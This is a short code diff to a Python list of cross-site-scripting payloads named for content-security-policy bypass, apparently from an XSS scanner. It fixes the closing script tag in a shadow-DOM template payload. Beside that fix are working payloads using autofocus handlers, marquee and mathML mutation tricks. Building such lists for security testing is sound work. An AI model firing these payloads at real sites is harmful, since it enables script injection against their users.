@@ -157,7 +157,7 @@ CSP_BYPASS_PAYLOADS = [
     f"<textarea autofocus onfocus=alert('{MARKER}')>",
     f"<keygen autofocus onfocus=alert('{MARKER}')>",
     f"<marquee onstart=alert('{MARKER}')>",
-    f"<island-ssr-headless><template shadowrootmode=\"open\"><script>alert('{MARKER}')}</template></island-ssr-headless>",
+    f"<island-ssr-headless><template shadowrootmode=\"open\"><script>alert('{MARKER}')</script></template></island-ssr-headless>",
     f"<xss tabindex=1 onfocus=alert('{MARKER}') autofocus>",
     f"<math><mtext><table><mglyph><style><img src=x onerror=alert('{MARKER}')>",
 ]
